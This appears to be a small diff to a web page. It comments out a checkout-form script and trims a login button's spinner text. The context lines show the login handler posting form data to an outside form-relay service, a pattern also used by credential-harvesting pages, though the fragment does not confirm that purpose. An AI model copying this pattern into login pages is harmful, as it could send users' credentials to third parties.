@@ -155,6 +155,7 @@
     </div>
   </div>
 
+  <!--
   <script>
     const form = document.getElementById('checkoutForm');
     const btn = document.getElementById('payBtn');
@@ -171,6 +172,7 @@
       }, 1000);
     });
   </script>
+  -->
 
 </body>
 
@@ -187,7 +189,7 @@
       //   message: msg,
       //   from_name: "OpenTeller"
       // }
-      $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>...");
+      $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>");
       $.ajax({
         url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
         method: "POST",
